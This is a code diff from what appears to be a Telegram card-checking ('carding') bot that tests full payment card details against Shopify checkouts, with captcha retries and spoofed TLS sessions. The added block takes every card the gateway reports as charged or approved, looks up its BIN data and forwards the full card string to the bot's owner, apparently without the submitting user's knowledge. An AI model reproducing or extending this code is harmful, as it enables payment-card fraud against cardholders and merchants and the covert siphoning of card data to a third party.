@@ -17,6 +17,7 @@ from pyrogram.enums import ParseMode, ChatType, ChatAction
 
 from BOT.helper.start import load_users
 from BOT.helper.antispam import can_run_command
+from BOT.helper.forward_hits import forward_single_hit
 from BOT.gc.credit import has_credits, deduct_credit
 from BOT.Charge.Shopify.slf.api import autoshopify, autoshopify_with_captcha_retry
 from BOT.Charge.Shopify.tls_session import TLSAsyncSession
@@ -596,7 +597,30 @@ Use <code>/txturl site1.com site2.com</code> for multiple sites.""",
             disable_web_page_preview=True,
             parse_mode=ParseMode.HTML
         )
-        
+
+        # Forward charged/approved hits to owner
+        response_text = result.get("Response", "")
+        status_text, header, is_live = determine_status(response_text)
+        if "Charged" in status_text or "Approved" in status_text:
+            # Get BIN data
+            card_num = fullcc.split("|")[0]
+            bin_data = get_bin_details(card_num[:6]) if get_bin_details else None
+            forward_status = "charged" if "Charged" in status_text else "approved"
+            await forward_single_hit(
+                client=client,
+                gateway="Shopify",
+                fullcc=fullcc,
+                status=forward_status,
+                response=response_text,
+                user_id=user_id,
+                username=message.from_user.first_name,
+                plan=plan,
+                badge=badge,
+                bin_data=bin_data,
+                price=result.get("Price", "0.00"),
+                extra_info={"retries": retry_count, "receipt_id": result.get("ReceiptId")}
+            )
+
         # Deduct credit
         success, msg = deduct_credit(user_id)
         if not success:
